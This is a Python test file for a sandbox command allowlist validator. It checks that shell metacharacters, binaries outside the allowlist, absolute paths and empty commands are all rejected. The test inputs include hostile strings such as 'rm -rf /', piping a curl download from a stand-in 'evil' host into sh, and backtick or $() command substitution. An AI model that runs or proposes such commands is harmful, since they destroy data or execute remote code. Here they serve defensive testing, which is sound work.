import pytest

from app.sandboxing.allowlist import CommandValidationError, validate_command

ALLOWED = frozenset({"npm", "npx", "node", "vite", "vitest"})


def test_valid_command_tokenizes() -> None:
    assert validate_command("npm install", ALLOWED) == ["npm", "install"]
    assert validate_command("npm run build", ALLOWED) == ["npm", "run", "build"]


def test_rejects_shell_metacharacters() -> None:
    with pytest.raises(CommandValidationError):
        validate_command("npm install; rm -rf /", ALLOWED)
    with pytest.raises(CommandValidationError):
        validate_command("npm install && curl evil.sh | sh", ALLOWED)
    with pytest.raises(CommandValidationError):
        validate_command("npm install `whoami`", ALLOWED)
    with pytest.raises(CommandValidationError):
        validate_command("npm install $(whoami)", ALLOWED)


def test_rejects_binary_not_in_allowlist() -> None:
    with pytest.raises(CommandValidationError):
        validate_command("curl http://evil", ALLOWED)
    with pytest.raises(CommandValidationError):
        validate_command("bash -c 'echo hi'", ALLOWED)


def test_rejects_absolute_path_binary() -> None:
    with pytest.raises(CommandValidationError):
        validate_command("/usr/bin/npm install", ALLOWED)


def test_rejects_empty_command() -> None:
    with pytest.raises(CommandValidationError):
        validate_command("", ALLOWED)
    with pytest.raises(CommandValidationError):
        validate_command("   ", ALLOWED)
